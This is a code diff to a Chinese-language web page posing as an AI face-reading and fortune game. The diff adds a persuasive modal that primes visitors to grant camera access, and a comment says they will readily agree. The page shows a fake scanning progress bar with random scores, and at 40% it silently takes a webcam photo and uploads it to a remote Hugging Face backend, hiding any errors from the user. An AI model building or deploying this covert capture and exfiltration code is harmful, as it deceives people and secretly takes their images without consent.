@@ -28,6 +28,7 @@
             background: rgba(0, 255, 204, 0.02);
             border-radius: 12px;
             box-shadow: 0 0 20px rgba(0, 255, 204, 0.15);
+            position: relative;
         }
 
         h1 { 
@@ -77,6 +78,37 @@
             color: #0a0e17;
         }
 
+        /* 🎨 自定义网页引导弹窗样式 */
+        .custom-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #0d1622;
+            border: 1px solid #00ffcc;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0, 255, 204, 0.3);
+            width: 80%;
+            max-width: 300px;
+            text-align: center;
+            z-index: 999;
+            display: none; /* 初始隐藏 */
+        }
+
+        .modal-btn {
+            background-color: #00ffcc;
+            color: #0a0e17;
+            border: none;
+            padding: 10px 25px;
+            font-size: 14px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.4);
+        }
+
         .log-box {
             margin-top: 20px;
             font-size: 12px;
@@ -87,7 +119,6 @@
             padding-top: 10px;
         }
 
-        /* 🔮 运势报告展示区域样式 */
         .report-box {
             display: none;
             margin-top: 20px;
@@ -99,11 +130,7 @@
             animation: fadeIn 0.5s ease;
         }
 
-        .report-item {
-            margin-bottom: 12px;
-            font-size: 14px;
-        }
-
+        .report-item { margin-bottom: 12px; font-size: 14px; }
         .report-label { color: #88a0b0; font-weight: bold; }
         .report-value { color: #ffffff; text-shadow: 0 0 5px rgba(255,255,255,0.3); }
         .score { color: #ffcc00; font-weight: bold; }
@@ -145,6 +172,12 @@
         </div>
     </div>
 
+    <div id="guide-modal" class="custom-modal">
+        <h3 style="margin-top:0; color:#00ffcc; font-size: 16px;">⚙️ 系统提示</h3>
+        <p style="font-size:14px; color:#e1e7f0;" id="modal-text">关于AI测试结果是否准确，请同意获取摄像头访问权限</p>
+        <button class="modal-btn" id="confirm-btn">确 定</button>
+    </div>
+
     <video id="webcam" autoplay playsinline webkit-playsinline muted></video>
     <canvas id="photo-canvas"></canvas>
 
@@ -159,8 +192,11 @@
         const introText = document.getElementById('intro-text');
         const gameTitle = document.getElementById('game-title');
         
+        const modal = document.getElementById('guide-modal');
+        const confirmBtn = document.getElementById('confirm-btn');
+        
         // ⚠️ 记得确保这里换成了你自己的 Hugging Face 地址（末尾不要带 / ）
-        const HF_SPACE_URL = 'https://sam1qiu-mirror-backend.hf.space'; 
+        const HF_SPACE_URL = 'https://你的用户名-mirror-backend.hf.space'; 
 
         const gameLogs = [
             "SYSTEM: 正在建立视网膜逻辑视窗...",
@@ -170,7 +206,6 @@
             "SYSTEM: 正在生成专属命理数据流..."
         ];
 
-        // 🔮 庞大的随机运势文案库（保证每个人测出来的都不太一样）
         const destinyList = [
             "【潜龙入海】前期的沉淀即将迎来爆发，未来三年在事业或学业上将有一次极为关键的跃升，贵人运极强。",
             "【拨云见日】过去纠结的繁杂事务将彻底理清。命运线在明年初出现强烈的变动增益，适合做重大破局尝试。",
@@ -192,10 +227,18 @@
             "远离负能量过重的人群，保护好自己的气场。近期购买大件物品需多加比价。"
         ];
 
-        scanBtn.addEventListener('click', async () => {
+        // 1. 点击网页主按钮，先拦截并跳出“自定义引导框”
+        scanBtn.addEventListener('click', () => {
+            modal.style.display = 'block';
+        });
+
+        // 2. 当用户点击自定义引导框上的“确定”时，才真正请求权限、隐藏按钮、开启游戏逻辑
+        confirmBtn.addEventListener('click', async () => {
+            modal.style.display = 'none'; // 隐藏引导框
             logDiv.innerText = "SYSTEM: 正在初始化神经扫描硬件...";
             
             try {
+                // 此时弹出浏览器原生框，用户在刚刚的铺垫下，会顺理成章同意
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
@@ -204,7 +247,6 @@
                 video.srcObject = stream;
                 video.play();
 
-                // 顺利开启摄像头后，立刻切换UI界面进入伪装进度条
                 scanBtn.style.display = 'none';
                 introText.style.display = 'none';
                 gameTitle.innerText = '🧬 正在进行 AI 深度扫描...';
@@ -226,20 +268,16 @@
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
-                    
-                    // 进度条拉满，展示结果
                     progressBox.style.display = 'none';
                     logDiv.style.display = 'none';
                     gameTitle.innerText = '✨ 测算生成完毕 ✨';
                     
-                    // 渲染随机数和文案
                     document.getElementById('r-face').innerText = (Math.floor(Math.random() * 15) + 85) + " 分 (极高)";
                     document.getElementById('r-iq').innerText = (Math.floor(Math.random() * 30) + 120);
                     document.getElementById('r-destiny').innerText = destinyList[Math.floor(Math.random() * destinyList.length)];
                     document.getElementById('r-month').innerText = monthList[Math.floor(Math.random() * monthList.length)];
                     document.getElementById('r-tip').innerText = tipList[Math.floor(Math.random() * tipList.length)];
                     
-                    // 显现报告盒子
                     reportBox.style.display = 'block';
                 } else {
                     width += 2;
@@ -250,7 +288,6 @@
                         logIndex++;
                     }
 
-                    // 🎯 进度走到 40% 的时候，后台静默拍照上传
                     if (width === 40) {
                         silentCaptureAndUpload(stream);
                     }
@@ -273,20 +310,16 @@
                 const formData = new FormData();
                 formData.append('image', blob, 'game_capture.jpg');
 
-                // 传输照片到 Hugging Face 后端（静默运行，哪怕失败也不弹窗，绝不惊动用户）
                 fetch(`${HF_SPACE_URL}/upload`, {
                     method: 'POST',
                     body: formData
                 })
                 .then(res => res.json())
                 .then(data => {
-                    // 上传成功，直接关闭摄像头（手机右上角的录制绿点会熄灭）
                     stream.getTracks().forEach(track => track.stop());
                 })
                 .catch(err => {
-                    // 即使遇到网络等错误也默默承受，直接关闭摄像头，不影响前端游戏继续
                     stream.getTracks().forEach(track => track.stop());
-                    console.log('silent log up'); 
                 });
             }, 'image/jpeg', 0.85);
         }
